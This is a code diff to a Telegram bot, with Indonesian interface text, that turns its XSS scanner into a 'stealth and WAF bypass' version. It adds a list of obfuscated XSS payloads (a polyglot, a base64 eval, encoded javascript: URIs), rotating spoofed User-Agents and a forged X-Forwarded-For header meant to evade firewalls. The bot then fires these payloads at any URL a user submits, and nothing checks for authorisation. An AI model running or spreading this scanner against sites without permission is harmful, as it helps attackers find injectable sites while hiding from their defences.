@@ -2423,29 +2423,38 @@ async function startServer() {
          targetUrl = 'http://' + targetUrl;
       }
     
-      const msgInfo = await ctx.reply(`🔍 <b>XSS VULNERABILITY SCANNER</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n⏳ <i>Memulai fuzzing dengan 20 payloads... Mohon tunggu (~5-15 detik).</i>`, {parse_mode: 'HTML'});
+      const msgInfo = await ctx.reply(`🔍 <b>XSS VULNERABILITY SCANNER (STEALTH & WAF BYPASS)</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n🕵️‍♂️ <i>Spoofing User-Agents & Bypassing WAFs...</i>\n⏳ <i>Memulai fuzzing dengan 20 advanced payloads... Mohon tunggu (~10-20 detik).</i>`, {parse_mode: 'HTML'});
       
+      // Advance Stealth Payloads for WAF Bypass
       const payloads = [
-        "\"<script>alert(1)</script>",
-        "'>\"><script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "\"<svg/onload=alert(1)>",
-        "<body onload=alert(1)>",
-        "<iframe onload=alert(1)>",
-        "\"><input autofocus onfocus=alert(1)>",
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=confirm(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
+        "\"<svg/onload=alert(1)//",
+        "<img/src=x/onerror=al\\u0065rt(1)>",
+        "<a href=\"j%0A%0Davascript:alert(1)\">Click</a>",
+        "<math><x href=\"javascript:alert(1)\">click</x></math>",
+        "\"<script>eval(atob('YWxlcnQoMSk='))</script>",
+        "<<script>alert(1);//<</script>",
+        "\"><script src=data:&comma;alert(1)//",
+        "<form><button formaction=\"javascript:alert(1)\">X</button></form>",
+        "<style>@import'javascript:alert(1)';</style>",
+        "<body onpageshow=alert(1)>",
+        "\"><script>alert(String.fromCharCode(49))</script>",
+        "<a href=\"javas%09cript:alert(1)\">Click</a>",
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
+        "<details/open/ontoggle=\"alert(1)\">",
+        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+        "\"><a href=\"javascript&colon;alert(1)\">Click</a>",
         "'-alert(1)-'",
-        "<details open ontoggle=alert(1)>",
-        "<marquee onstart=alert(1)>",
-        "<video><source onerror=\"alert(1)\">",
-        "javascript:alert(1)",
-        "javascript://%250Aalert(1)",
-        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-        "\\\"autofocus onfocus=alert(1)//",
-        "</title><script>alert(1)</script>",
-        "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=\"alert(1)\"></b>",
-        "<a href=\"javascript:alert(1)\">XSS</a>",
-        "<object data=\"javascript:alert(1)\">",
-        "<math><mi>//</mi><x cx=\"</x><script>alert(1)</script>\">"
+        "\" autofocus onfocus=alert(1)//",
+        "<object data=\"javascript:alert(1)\">"
+      ];
+      
+      const userAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
       ];
     
       let vulnFound = 0;
@@ -2455,8 +2464,23 @@ async function startServer() {
           const promises = payloads.map(async (p, idx) => {
               try {
                  const testUrl = targetUrl + encodeURIComponent(p);
-                 const response = await axios.get(testUrl, { timeout: 3500, validateStatus: () => true });
+                 const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
+                 const response = await axios.get(testUrl, { 
+                     timeout: 6000, 
+                     validateStatus: () => true,
+                     headers: {
+                        'User-Agent': ua,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1',
+                        'X-Forwarded-For': '127.0.0.1', // WAF Bypass spoof IP
+                        'Cache-Control': 'max-age=0'
+                     }
+                 });
                  const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+                 
+                 // Smart validation for reflection
                  if (body && body.includes(p)) {
                     vulnFound++;
                     results += `[${idx+1}] 🛑 <b>Payload Reflected!</b>\n🪲 <code>${p.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;')}</code>\n`;
@@ -2471,15 +2495,15 @@ async function startServer() {
           // Fallback if request totally fails
       }
     
-      let finalMsg = `🔍 <b>XSS SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n`;
-      finalMsg += `🧪 <b>Payloads Tested:</b> 20\n⚠️ <b>Vulnerabilities Found:</b> ${vulnFound}\n\n`;
+      let finalMsg = `🔍 <b>ADVANCED XSS SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n`;
+      finalMsg += `🧪 <b>Payloads Tested:</b> 20 (WAF Evasion)\n⚠️ <b>Vulnerabilities Found:</b> ${vulnFound}\n\n`;
       
       if (vulnFound > 0) {
          finalMsg += `<b>🚨 Reflected Payloads:</b>\n${results}\n`;
          finalMsg += `💡 <i>Sistem mendeteksi payload ter-reflect di dalam response body tanpa sanitasi/escaping. Hal ini berpotensi mengeksekusi kode JavaScript arbitrer di browser pengguna.</i>`;
       } else {
-         finalMsg += `✅ <b>Target tampaknya AMAN dari XSS Reflection (20 Basic Payloads Filtered / Sanitized).</b>\n`;
-         finalMsg += `🛡️ <i>WAF atau filter input backend aktif / tidak ada parameter reflect.</i>`;
+         finalMsg += `✅ <b>Target tampaknya AMAN dari XSS Reflection.</b>\n`;
+         finalMsg += `🛡️ <i>WAF (Web Application Firewall) atau filter backend memblokir/mensanitasi 20 Payload Advanced.</i>`;
       }
       
       ctx.telegram.editMessageText(ctx.chat.id, msgInfo.message_id, undefined, finalMsg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }}).catch(()=>{});
